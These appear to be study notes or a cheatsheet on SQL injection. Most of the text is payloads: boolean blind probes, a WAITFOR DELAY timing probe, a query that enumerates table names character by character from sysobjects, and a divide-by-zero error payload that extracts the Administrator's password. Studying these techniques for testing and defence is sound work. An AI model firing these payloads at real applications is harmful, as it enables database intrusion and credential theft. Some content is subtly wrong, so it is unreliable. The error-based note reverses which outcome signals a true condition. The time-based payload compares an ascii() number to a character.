## Cheatsheet

![[Sqlmap_Essentials_Module_Cheat_Sheet.pdf]]


## Blind-based SQL Injection

- Assume we're trying to query an ID using the following syntax:
```sql
SELECT * FROM products WHERE id = 42 and 1=1.  (1)
SELECT * FROM products WHERE id = 42 and 1=0   (2)
```

- If the query
```sql
SELECT * FROM products WHERE id = 42
```

is true => it will behave the same as (1) and if false, it will behave the same as (2).

## Time-based SQL Injection

- To check if a DB is susceptible to a **time-based SQL Injection** we use the following command:
```sql
SELECT * FROM products WHERE id = 1; WAITFOR DELAY '0:0:10'
```
**Note**: If the application is susceptible to time-based SQL injection we would see a 10s delay. Then, we can use the following code + **time-based SQL Injection** to get the name of the first DB table:
```sql
42; IF(EXISTS(SELECT TOP 1 *
  FROM sysobjects
  WHERE id=(SELECT TOP 1 id
    FROM (SELECT TOP 1 id 
      FROM sysobjects 
      ORDER BY id) 
    AS subq
    ORDER BY id DESC)
  AND ascii(lower(substring(name, 1, 1))) = 'a'))
  WAITFOR DELAY '0:0:10'
```

## SQL Injection by Triggering Conditional Errors

```sql
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```
**Note**: If condition is true, i.e. the admin password begins with a letter > m, then it return a or otherwise it will trigger a divide by zero error.


